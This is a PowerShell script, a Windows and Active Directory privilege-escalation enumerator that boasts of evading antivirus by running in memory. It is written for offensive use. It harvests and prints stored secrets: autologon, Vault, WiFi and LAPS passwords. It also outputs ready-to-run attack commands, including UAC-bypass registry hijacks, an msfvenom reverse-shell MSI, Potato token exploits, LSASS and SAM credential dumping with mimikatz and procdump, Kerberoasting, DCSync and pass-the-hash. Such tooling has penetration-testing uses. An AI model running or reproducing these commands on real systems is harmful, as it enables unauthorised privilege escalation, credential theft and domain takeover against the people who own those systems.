# PrivEsc Enumeration - Pure PowerShell v2.0
# Comprehensive Windows + AD Privilege Escalation Enumerator
# No binary, no AV detection - runs entirely in memory

Write-Host ""
Write-Host "  ___      _         ___" -ForegroundColor Red
Write-Host " | _ \_ __(_)_ _____| __|_ _ _  _ _ __" -ForegroundColor Red  
Write-Host " |  _/ '_| \ V / -_) _|| ' \ || | '  \" -ForegroundColor Red
Write-Host " |_| |_| |_|\_/\___|___|_||_\_,_|_|_|_|" -ForegroundColor Red
Write-Host "  Windows PrivEsc Enumerator v2.0 - PowerShell Edition" -ForegroundColor DarkGray
Write-Host ""

function Section($t) { Write-Host ""; Write-Host "=== $t ===" -ForegroundColor Cyan }
function Ok($m) { Write-Host "[+] $m" -ForegroundColor Green }
function Fail($m) { Write-Host "[-] $m" -ForegroundColor DarkGray }
function Info($m) { Write-Host "[*] $m" -ForegroundColor Blue }
function Vuln($m) { Write-Host "[!] $m" -ForegroundColor Yellow -BackgroundColor DarkRed }
function Cmd($m) { Write-Host "    -> $m" -ForegroundColor Cyan }
function SubSection($t) { Write-Host ""; Write-Host "  -- $t --" -ForegroundColor White }

# ==================== SYSTEM INFO ====================
Section "SYSTEM INFORMATION"
Info "Hostname: $env:COMPUTERNAME"
Info "Username: $env:USERDOMAIN\$env:USERNAME"
Info "Architecture: $env:PROCESSOR_ARCHITECTURE"

$os = Get-WmiObject Win32_OperatingSystem -EA SilentlyContinue
if ($os) {
    Info "OS: $($os.Caption) Build $($os.BuildNumber)"
    $script:BuildNum = [int]$os.BuildNumber
}

$cs = Get-WmiObject Win32_ComputerSystem -EA SilentlyContinue
if ($cs.PartOfDomain) {
    Vuln "DOMAIN JOINED: $($cs.Domain)"
} else {
    Info "Workgroup: $($cs.Workgroup)"
}

# ==================== PRIVILEGES ====================
Section "PRIVILEGES & GROUPS"

$grpOut = whoami /groups 2>$null
if ($grpOut -match "S-1-16-12288") { Vuln "HIGH INTEGRITY - Already elevated!" }
elseif ($grpOut -match "S-1-16-16384") { Vuln "SYSTEM INTEGRITY - Full control!" }
elseif ($grpOut -match "S-1-16-8192") { Info "Medium Integrity (standard user)" }

if ($grpOut -match "BUILTIN\\Administrators") {
    Vuln "User is in LOCAL ADMINISTRATORS group!"
    Cmd "UAC bypass will get High Integrity without password"
}
if ($grpOut -match "Backup Operators") {
    Vuln "Backup Operators - Can read SAM/SYSTEM hives!"
}

Write-Host ""
Write-Host "  Key Privileges:" -ForegroundColor White
$privOut = whoami /priv 2>$null
$dangerousPrivs = @{
    "SeImpersonatePrivilege" = "GodPotato: .\gp.exe -cmd 'cmd /c whoami'"
    "SeAssignPrimaryTokenPrivilege" = "Token manipulation"
    "SeDebugPrivilege" = "procdump -ma lsass.exe lsass.dmp"
    "SeBackupPrivilege" = "reg save HKLM\SAM sam.hiv"
    "SeRestorePrivilege" = "Write to any file"
    "SeTakeOwnershipPrivilege" = "Take ownership of files"
    "SeLoadDriverPrivilege" = "Load vulnerable driver"
}

foreach ($priv in $dangerousPrivs.Keys) {
    if ($privOut -match $priv) {
        Vuln "$priv ENABLED"
        Cmd $dangerousPrivs[$priv]
    }
}

# ==================== UAC ====================
Section "UAC STATUS & BYPASS METHODS"

$uac = Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -EA SilentlyContinue
Info "EnableLUA: $($uac.EnableLUA)"
Info "ConsentPromptBehaviorAdmin: $($uac.ConsentPromptBehaviorAdmin) (0=Never notify, 5=Always)"
Info "PromptOnSecureDesktop: $($uac.PromptOnSecureDesktop)"
Info "FilterAdministratorToken: $($uac.FilterAdministratorToken)"

if ($uac.EnableLUA -eq 0) {
    Vuln "UAC DISABLED! No bypass needed."
} elseif ($uac.ConsentPromptBehaviorAdmin -eq 0) {
    Vuln "UAC set to NEVER NOTIFY - auto-elevate without prompt!"
} elseif ($uac.ConsentPromptBehaviorAdmin -le 2) {
    Vuln "UAC BYPASSABLE - ConsentPrompt allows silent elevation!"
}

$integrityCheck = whoami /groups 2>$null
if ($integrityCheck -match "S-1-16-12288|High Mandatory") {
    Vuln "Already HIGH INTEGRITY - NO UAC bypass needed!"
} elseif ($integrityCheck -match "S-1-16-16384|System Mandatory") {
    Vuln "SYSTEM INTEGRITY - Full control!"
} else {
    SubSection "Auto-Elevate Binaries (Registry Hijack)"
    
    # fodhelper (Win10+) - ms-settings
    if (Test-Path "C:\Windows\System32\fodhelper.exe") {
        if ($BuildNum -ge 10240) {
            Vuln "fodhelper.exe: AVAILABLE (Win10+ Build $BuildNum)"
            Cmd "reg add HKCU\Software\Classes\ms-settings\shell\open\command /ve /d 'cmd.exe /c start cmd' /f"
            Cmd "reg add HKCU\Software\Classes\ms-settings\shell\open\command /v DelegateExecute /t REG_SZ /f"
            Cmd "fodhelper.exe ; timeout 2 ; reg delete HKCU\Software\Classes\ms-settings /f"
        }
    }
    
    # computerdefaults (Win10+) - ms-settings  
    if (Test-Path "C:\Windows\System32\computerdefaults.exe") {
        if ($BuildNum -ge 10240) {
            Ok "computerdefaults.exe: Available (same technique as fodhelper)"
        }
    }
    
    # wsreset (Win10 1803+)
    if (Test-Path "C:\Windows\System32\wsreset.exe") {
        if ($BuildNum -ge 17134) {
            Vuln "wsreset.exe: AVAILABLE (Win10 1803+)"
            Cmd "reg add HKCU\Software\Classes\AppX82a6gwre4fdg3bt635ber24ueqv6he9fj\Shell\open\command /ve /d cmd.exe /f"
            Cmd "reg add HKCU\Software\Classes\AppX82a6gwre4fdg3bt635ber24ueqv6he9fj\Shell\open\command /v DelegateExecute /t REG_SZ /f"
            Cmd "wsreset.exe"
        }
    }
    
    # sdclt (Win10 < 17025)
    if (Test-Path "C:\Windows\System32\sdclt.exe") {
        if ($BuildNum -lt 17025 -and $BuildNum -ge 10240) {
            Vuln "sdclt.exe: AVAILABLE (not patched < Build 17025)"
            Cmd "reg add 'HKCU\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe' /ve /d cmd.exe /f"
            Cmd "sdclt.exe /kickoffelev"
        } elseif ($BuildNum -ge 17025) {
            Fail "sdclt.exe: Patched in Build $BuildNum"
        }
    }
    
    # eventvwr (Win7-10 < 15031)
    if (Test-Path "C:\Windows\System32\eventvwr.exe") {
        if ($BuildNum -lt 15031) {
            Vuln "eventvwr.exe: AVAILABLE (mscfile hijack)"
            Cmd "reg add HKCU\Software\Classes\mscfile\shell\open\command /ve /d cmd.exe /f"
            Cmd "eventvwr.exe"
        } else {
            Fail "eventvwr.exe: Patched in Build $BuildNum"
        }
    }
    
    # cmstp (COM interface)
    if (Test-Path "C:\Windows\System32\cmstp.exe") {
        Vuln "cmstp.exe: AVAILABLE (requires INF file)"
        Cmd "Create .inf with CommandToExecute, run: cmstp.exe /au /s evil.inf"
    }
    
    # SilentCleanup Scheduled Task
    $silentCleanup = schtasks /query /tn "\Microsoft\Windows\DiskCleanup\SilentCleanup" 2>$null
    if ($silentCleanup) {
        Vuln "SilentCleanup Task: AVAILABLE"
        Cmd "Set %windir% env var to 'cmd /c start cmd' then trigger task"
    }
    
    SubSection "DLL Hijacking UAC Bypasses"
    
    # sysprep DLL hijack
    if (Test-Path "C:\Windows\System32\Sysprep\sysprep.exe") {
        Vuln "sysprep.exe: DLL hijack possible (cryptbase.dll, shcore.dll)"
        Cmd "Copy malicious DLL to C:\Windows\System32\Sysprep\"
    }
    
    # migwiz DLL hijack  
    if (Test-Path "C:\Windows\System32\migwiz\migwiz.exe") {
        Ok "migwiz.exe: DLL hijack possible (cryptbase.dll)"
    }
    
    # pkgmgr/dism
    if (Test-Path "C:\Windows\System32\Dism") {
        Ok "DISM folder: Check for DLL hijack opportunities"
    }
    
    SubSection "COM Object UAC Bypasses"
    
    Info "CMSTPLUA COM: {3E5FC7F9-9A51-4367-9063-A120244FBEC7}"
    Cmd "Can elevate via COM interface without prompt"
    
    Info "ICMLuaUtil: Elevated COM object"
    Info "ColorDataProxy: CLSID {D2E7041B-2927-42fb-8E9F-7CE93B6DC937}"
}

# ==================== DEFENDER ====================
Section "SECURITY SOFTWARE"

SubSection "Windows Defender"
try {
    $mp = Get-MpPreference -EA Stop
    if ($mp.DisableRealtimeMonitoring) {
        Vuln "Defender Real-time: DISABLED!"
    } else {
        Info "Defender Real-time: Enabled"
    }
    
    if ($mp.DisableIOAVProtection) { Vuln "IOAV Protection: DISABLED" }
    if ($mp.DisableBehaviorMonitoring) { Vuln "Behavior Monitoring: DISABLED" }
    if ($mp.DisableScriptScanning) { Vuln "Script Scanning: DISABLED" }
    
    if ($mp.ExclusionPath) {
        Vuln "Defender Path Exclusions:"
        $mp.ExclusionPath | ForEach-Object { Cmd $_ }
    }
    if ($mp.ExclusionProcess) {
        Vuln "Defender Process Exclusions:"
        $mp.ExclusionProcess | ForEach-Object { Cmd $_ }
    }
    if ($mp.ExclusionExtension) {
        Vuln "Defender Extension Exclusions:"
        $mp.ExclusionExtension | ForEach-Object { Cmd $_ }
    }
} catch {
    Info "Cannot query Defender (may need admin or not installed)"
}

$tp = Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows Defender\Features" -EA SilentlyContinue
if ($tp.TamperProtection -eq 0) {
    Vuln "Tamper Protection: OFF"
} elseif ($tp.TamperProtection -eq 5) {
    Info "Tamper Protection: ON"
}

SubSection "AMSI Status"
try {
    $asm = [System.Reflection.Assembly]::LoadWithPartialName('System.Management.Automation')
    $amsiType = $asm.GetType('System.Management.Automation.AmsiUtils')
    if ($amsiType) { Info "AMSI: Loaded" }
} catch {
    Vuln "AMSI: May be bypassed or unavailable"
}

SubSection "AppLocker / WDAC"
$appLocker = Get-AppLockerPolicy -Effective -EA SilentlyContinue
if ($appLocker) {
    Info "AppLocker: Configured"
    $appLocker.RuleCollections | ForEach-Object {
        Info "  $_"
    }
} else {
    Fail "AppLocker: Not configured"
}

SubSection "Other Security Software"
$avProcesses = @("MsMpEng","avgnt","avp","bdagent","ekrn","ccSvcHst","mcshield","savservice","SentinelAgent","CylanceSvc","CSFalconService","cb","CarbonBlack")
$runningAV = Get-Process | Where-Object { $avProcesses -contains $_.ProcessName }
if ($runningAV) {
    $runningAV | ForEach-Object { Info "AV Process: $($_.ProcessName) (PID: $($_.Id))" }
} else {
    Vuln "No known AV processes detected!"
}

# ==================== NETWORK ====================
Section "NETWORK INFORMATION"

SubSection "Network Adapters"
Get-NetIPAddress -EA SilentlyContinue | Where-Object { $_.AddressFamily -eq 'IPv4' -and $_.IPAddress -ne '127.0.0.1' } | ForEach-Object {
    Info "$($_.InterfaceAlias): $($_.IPAddress)/$($_.PrefixLength)"
}

SubSection "Listening Ports"
$listeners = Get-NetTCPConnection -State Listen -EA SilentlyContinue | Sort-Object LocalPort | Select-Object -First 15
$listeners | ForEach-Object {
    $proc = Get-Process -Id $_.OwningProcess -EA SilentlyContinue
    $criticalPorts = @(80,443,445,3389,5985,5986,8080,8443)
    if ($criticalPorts -contains $_.LocalPort) {
        Vuln "$($_.LocalPort) - $($proc.ProcessName)"
    } else {
        Ok "$($_.LocalPort) - $($proc.ProcessName)"
    }
}

SubSection "ARP Cache"
arp -a 2>$null | Select-String "dynamic" | Select-Object -First 10 | ForEach-Object { Info $_.ToString().Trim() }

SubSection "DNS Cache (Interesting)"
$dns = Get-DnsClientCache -EA SilentlyContinue | Where-Object { $_.Entry -notmatch "microsoft|windows|bing|msn" } | Select-Object -First 10
if ($dns) { $dns | ForEach-Object { Ok "$($_.Entry) -> $($_.Data)" } }

SubSection "Routing Table"
route print 2>$null | Select-String "0.0.0.0" | Select-Object -First 3 | ForEach-Object { Info $_.ToString().Trim() }

# ==================== PROCESSES ====================
Section "INTERESTING PROCESSES"

SubSection "High-Value Targets"
$highValue = @("sqlservr","postgres","mysqld","oracle","mongod","redis-server","apache","httpd","nginx","tomcat","iis","w3wp")
Get-Process | Where-Object { $highValue -contains $_.ProcessName } | ForEach-Object {
    Vuln "$($_.ProcessName) (PID: $($_.Id))"
}

SubSection "Admin/SYSTEM Processes"
Get-Process -IncludeUserName -EA SilentlyContinue | Where-Object { $_.UserName -match "SYSTEM|Administrator" } | Select-Object -First 10 | ForEach-Object {
    Info "$($_.ProcessName) - $($_.UserName)"
}

# ==================== CREDENTIALS ====================
Section "CREDENTIAL HUNTING"

SubSection "Autologon Credentials"
$wl = Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -EA SilentlyContinue
if ($wl.DefaultPassword) {
    Vuln "AUTOLOGON CREDENTIALS FOUND!"
    Cmd "Domain: $($wl.DefaultDomainName)"
    Cmd "Username: $($wl.DefaultUserName)"
    Cmd "Password: $($wl.DefaultPassword)"
} elseif ($wl.AutoAdminLogon -eq 1) {
    Info "AutoAdminLogon enabled but no cached password"
}

SubSection "Stored Credentials (cmdkey)"
$creds = cmdkey /list 2>$null
if ($creds -match "Target:") {
    $creds | Select-String "Target:" | ForEach-Object { Vuln $_.ToString().Trim() }
    Cmd "runas /savecred /user:DOMAIN\user cmd.exe"
} else {
    Fail "No stored credentials"
}

SubSection "Windows Vault"
$vault = [Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]
try {
    $v = New-Object Windows.Security.Credentials.PasswordVault
    $v.RetrieveAll() | ForEach-Object {
        $_.RetrievePassword()
        Vuln "Vault: $($_.Resource) - $($_.UserName) : $($_.Password)"
    }
} catch {
    Fail "Cannot access Windows Vault"
}

SubSection "WiFi Passwords"
$profiles = netsh wlan show profiles 2>$null | Select-String "All User Profile" | ForEach-Object { ($_ -split ":")[-1].Trim() }
foreach ($p in $profiles | Select-Object -First 5) {
    $key = netsh wlan show profile "$p" key=clear 2>$null | Select-String "Key Content"
    if ($key) {
        Vuln "WiFi: $p"
        Cmd ($key -split ":")[-1].Trim()
    }
}

SubSection "Browser Credentials"
$chromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
if (Test-Path $chromePath) {
    Vuln "Chrome Login Data exists"
    Cmd $chromePath
}

$firefoxPath = "$env:APPDATA\Mozilla\Firefox\Profiles"
if (Test-Path $firefoxPath) {
    $ffProfiles = Get-ChildItem $firefoxPath -Directory
    if ($ffProfiles) {
        Vuln "Firefox profiles found"
        $ffProfiles | ForEach-Object { Cmd $_.FullName }
    }
}

$edgePath = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"
if (Test-Path $edgePath) {
    Vuln "Edge Login Data exists"
    Cmd $edgePath
}

SubSection "SAM/SYSTEM/SECURITY Backup"
$samBackups = @(
    "C:\Windows\repair\SAM",
    "C:\Windows\System32\config\RegBack\SAM",
    "C:\Windows\System32\config\SAM"
)
foreach ($sam in $samBackups) {
    if (Test-Path $sam -EA SilentlyContinue) {
        $readable = $true
        try { [System.IO.File]::OpenRead($sam).Close() } catch { $readable = $false }
        if ($readable) {
            Vuln "SAM readable: $sam"
        } else {
            Info "SAM exists: $sam (access denied)"
        }
    }
}

SubSection "Interesting Files"
$interestingFiles = @(
    "C:\unattend.xml", "C:\sysprep.inf", "C:\sysprep\sysprep.xml",
    "$env:WINDIR\Panther\Unattend.xml", "$env:WINDIR\Panther\Unattended.xml",
    "$env:WINDIR\system32\sysprep\unattend.xml", "$env:WINDIR\system32\sysprep\Panther\unattend.xml"
)
foreach ($f in $interestingFiles) {
    if (Test-Path $f -EA SilentlyContinue) {
        Vuln "Found: $f"
    }
}

# Search for password files
$pwdFiles = Get-ChildItem -Path C:\Users -Recurse -Include "*password*","*cred*","*.kdbx","*config*.xml","web.config","*.config" -EA SilentlyContinue | Select-Object -First 10
if ($pwdFiles) {
    SubSection "Potential Password Files"
    $pwdFiles | ForEach-Object { Ok $_.FullName }
}

# ==================== ALWAYS INSTALL ELEVATED ====================
Section "ALWAYS INSTALL ELEVATED"

$aie1 = (Get-ItemProperty "HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer" -EA SilentlyContinue).AlwaysInstallElevated
$aie2 = (Get-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer" -EA SilentlyContinue).AlwaysInstallElevated

if ($aie1 -eq 1 -and $aie2 -eq 1) {
    Vuln "AlwaysInstallElevated ENABLED - MSI privesc!"
    Cmd "msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f msi -o evil.msi"
    Cmd "msiexec /quiet /qn /i evil.msi"
} else {
    Fail "Not vulnerable"
}

# ==================== UNQUOTED SERVICE PATHS ====================
Section "UNQUOTED SERVICE PATHS"

Get-WmiObject Win32_Service -EA SilentlyContinue | Where-Object {
    ($_.PathName -notmatch '^\s*"') -and ($_.PathName -match '\s') -and ($_.PathName -match '\.exe')
} | ForEach-Object {
    Vuln "$($_.Name)"
    Cmd $_.PathName
} | Select-Object -First 5

if (-not $?) { Fail "No unquoted paths found" }

# ==================== WRITABLE SERVICES ====================
Section "WRITABLE SERVICE BINARIES"

$found = $false
Get-WmiObject Win32_Service -EA SilentlyContinue | ForEach-Object {
    $path = $_.PathName -replace '"',''
    $path = ($path -split '\s+-')[0].Trim()
    $path = ($path -split '\s+/')[0].Trim()
    if ($path -and (Test-Path $path -EA SilentlyContinue)) {
        try {
            $acl = Get-Acl $path -EA Stop
            $writeRights = "Write|FullControl|Modify"
            $commonIdentities = "Users|Everyone|Authenticated"
            $access = $acl.Access | Where-Object {
                ($_.FileSystemRights -match $writeRights) -and ($_.IdentityReference -match $commonIdentities)
            }
            if ($access) {
                Vuln "WRITABLE: $($_.Name)"
                Cmd $path
                $script:found = $true
            }
        } catch {}
    }
}
if (-not $found) { Fail "No writable service binaries found" }

# ==================== SCHEDULED TASKS ====================
Section "SCHEDULED TASKS (SYSTEM)"

$tasks = schtasks /query /fo CSV /v 2>$null | ConvertFrom-Csv -EA SilentlyContinue
$tasks | Where-Object { $_.'Run As User' -eq 'SYSTEM' -and $_.'Task To Run' -notmatch 'COM handler' } | 
    Select-Object -First 5 | ForEach-Object {
    Info $_.TaskName
    Cmd $_.'Task To Run'
}

# ==================== PATH HIJACKING ====================
Section "PATH DLL HIJACKING"

$pathDirs = $env:PATH -split ";"
foreach ($dir in $pathDirs | Where-Object { $_ -and (Test-Path $_) } | Select-Object -First 10) {
    try {
        $acl = Get-Acl $dir -EA Stop
        $writeRights = "Write|FullControl|Modify"
        $commonIdentities = "Users|Everyone|Authenticated"
        $access = $acl.Access | Where-Object {
            ($_.FileSystemRights -match $writeRights) -and ($_.IdentityReference -match $commonIdentities)
        }
        if ($access) {
            Vuln "WRITABLE PATH: $dir"
        }
    } catch {}
}

# ==================== DOMAIN INFO ====================
if ($cs.PartOfDomain) {
    Section "ACTIVE DIRECTORY ENUMERATION"
    
    Info "Domain: $($cs.Domain)"
    
    SubSection "Domain Controllers"
    $dc = nltest /dclist:$($cs.Domain) 2>$null | Select-String "\[" 
    if ($dc) { $dc | ForEach-Object { Ok $_.ToString().Trim() } }
    
    $logonServer = $env:LOGONSERVER -replace '\\\\',''
    if ($logonServer) { Info "Logon Server: $logonServer" }
    
    SubSection "Domain Admins"
    net group "Domain Admins" /domain 2>$null | Select-String -NotMatch "^The|^Group|^Comment|^Members|^-|^\s*$" | 
        ForEach-Object { if ($_.ToString().Trim()) { Vuln $_.ToString().Trim() } }
    
    SubSection "Enterprise Admins"
    net group "Enterprise Admins" /domain 2>$null | Select-String -NotMatch "^The|^Group|^Comment|^Members|^-|^\s*$" | 
        ForEach-Object { if ($_.ToString().Trim()) { Ok $_.ToString().Trim() } }
    
    SubSection "Domain Controllers Group"
    net group "Domain Controllers" /domain 2>$null | Select-String -NotMatch "^The|^Group|^Comment|^Members|^-|^\s*$" | 
        ForEach-Object { if ($_.ToString().Trim()) { Ok $_.ToString().Trim() } }
    
    SubSection "Kerberoastable SPNs"
    $spns = setspn -Q */* 2>$null | Select-String "CN=" | Select-Object -First 10
    if ($spns) {
        $spns | ForEach-Object { 
            $line = $_.ToString().Trim()
            if ($line -match "KRBTGT|admin|sql|svc|service" ) {
                Vuln $line
            } else {
                Ok $line
            }
        }
        Cmd "GetUserSPNs.py DOMAIN/user:pass -dc-ip DC_IP -request"
    } else {
        Fail "No SPNs found or access denied"
    }
    
    SubSection "AS-REP Roastable Users (No Pre-Auth)"
    # Check if current user doesn't require preauth
    $currentUserDN = ([adsisearcher]"samaccountname=$env:USERNAME").FindOne()
    if ($currentUserDN) {
        $uac = $currentUserDN.Properties["useraccountcontrol"][0]
        if ($uac -band 0x400000) {
            Vuln "Current user DOES NOT REQUIRE Kerberos pre-auth!"
            Cmd "GetNPUsers.py DOMAIN/ -usersfile users.txt -dc-ip DC_IP"
        }
    }
    
    SubSection "LDAP Enumeration"
    try {
        $searcher = [adsisearcher]""
        $searcher.Filter = "(objectClass=computer)"
        $computers = $searcher.FindAll()
        Info "Domain Computers: $($computers.Count)"
        
        $searcher.Filter = "(objectClass=user)"
        $users = $searcher.FindAll()
        Info "Domain Users: $($users.Count)"
        
        # Find computers with unconstrained delegation
        $searcher.Filter = "(&(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))"
        $unconstrained = $searcher.FindAll()
        if ($unconstrained.Count -gt 0) {
            Vuln "Computers with UNCONSTRAINED DELEGATION:"
            $unconstrained | ForEach-Object { Cmd $_.Properties["cn"][0] }
        }
        
        # Find users with unconstrained delegation
        $searcher.Filter = "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=524288))"
        $unconstrainedUsers = $searcher.FindAll()
        if ($unconstrainedUsers.Count -gt 0) {
            Vuln "Users with UNCONSTRAINED DELEGATION:"
            $unconstrainedUsers | ForEach-Object { Cmd $_.Properties["cn"][0] }
        }
        
        # Find constrained delegation
        $searcher.Filter = "(msDS-AllowedToDelegateTo=*)"
        $constrained = $searcher.FindAll()
        if ($constrained.Count -gt 0) {
            Vuln "Objects with CONSTRAINED DELEGATION:"
            $constrained | ForEach-Object { 
                $name = $_.Properties["cn"][0]
                $delegateTo = $_.Properties["msds-allowedtodelegateto"]
                Cmd "$name -> $($delegateTo -join ', ')"
            }
        }
        
        # LAPS
        $searcher.Filter = "(ms-Mcs-AdmPwd=*)"
        $laps = $searcher.FindAll()
        if ($laps.Count -gt 0) {
            Vuln "LAPS Passwords Readable! ($($laps.Count) computers)"
            $laps | Select-Object -First 5 | ForEach-Object {
                $name = $_.Properties["cn"][0]
                $pwd = $_.Properties["ms-mcs-admpwd"][0]
                Cmd "$name : $pwd"
            }
        }
        
    } catch {
        Fail "LDAP enumeration failed: $_"
    }
    
    SubSection "Trust Relationships"
    nltest /domain_trusts 2>$null | ForEach-Object { 
        if ($_ -match "->") { Ok $_ }
    }
    
    SubSection "GPO Abuse"
    Info "Check for GPP Passwords:"
    Cmd "findstr /S /I cpassword \\\\$($cs.Domain)\sysvol\*.xml"
    $gppPath = "\\$($cs.Domain)\SYSVOL\$($cs.Domain)\Policies"
    if (Test-Path $gppPath -EA SilentlyContinue) {
        $gppXml = Get-ChildItem -Path $gppPath -Recurse -Include "Groups.xml","Services.xml","Scheduledtasks.xml","DataSources.xml","Printers.xml","Drives.xml" -EA SilentlyContinue
        if ($gppXml) {
            Vuln "GPP XML files found - check for cpassword!"
            $gppXml | Select-Object -First 5 | ForEach-Object { Cmd $_.FullName }
        }
    }
}

# ==================== SUMMARY ====================
Section "ATTACK PATHS & QUICK WINS"

SubSection "UAC Bypass (If Local Admin)"
Cmd "# fodhelper method:"
Cmd "reg add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /ve /d 'cmd.exe /c start cmd' /f"
Cmd "reg add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /v DelegateExecute /t REG_SZ /f"
Cmd "fodhelper.exe ; timeout 2 ; reg delete HKCU\\Software\\Classes\\ms-settings /f"

SubSection "Potato Attacks (If SeImpersonatePrivilege)"
Cmd "# GodPotato (recommended):"
Cmd ".\\GodPotato.exe -cmd 'cmd /c whoami'"
Cmd "# PrintSpoofer:"
Cmd ".\\PrintSpoofer.exe -i -c cmd"
Cmd "# JuicyPotato (older systems):"
Cmd ".\\JuicyPotato.exe -l 1337 -p c:\\windows\\system32\\cmd.exe -t *"

SubSection "LSASS Credential Dump (If Admin)"
Cmd "# procdump:"
Cmd "procdump -ma lsass.exe lsass.dmp"
Cmd "# mimikatz:"
Cmd "mimikatz.exe 'privilege::debug' 'sekurlsa::logonpasswords' exit"
Cmd "# comsvcs:"
Cmd "rundll32 comsvcs.dll MiniDump (Get-Process lsass).Id lsass.dmp full"

SubSection "Registry Credential Dump (If Admin)"
Cmd "reg save HKLM\\SAM sam.hiv"
Cmd "reg save HKLM\\SYSTEM system.hiv"
Cmd "reg save HKLM\\SECURITY security.hiv"
Cmd "# Then: secretsdump.py -sam sam.hiv -system system.hiv -security security.hiv LOCAL"

if ($cs.PartOfDomain) {
    SubSection "Domain Attacks"
    Cmd "# Kerberoasting:"
    Cmd "GetUserSPNs.py $($cs.Domain)/user:pass -dc-ip DC_IP -request"
    Cmd "# AS-REP Roasting:"
    Cmd "GetNPUsers.py $($cs.Domain)/ -usersfile users.txt -dc-ip DC_IP -format hashcat"
    Cmd "# DCSync (if DA):"
    Cmd "secretsdump.py $($cs.Domain)/admin:pass@DC_IP"
    Cmd "# Pass-the-Hash:"
    Cmd "pth-winexe -U DOMAIN/admin%hash //TARGET cmd"
}

Write-Host ""
Write-Host "======================================================================" -ForegroundColor Green
Write-Host "  [+] Enumeration complete!                                          " -ForegroundColor Green
Write-Host "======================================================================" -ForegroundColor Green
Write-Host ""
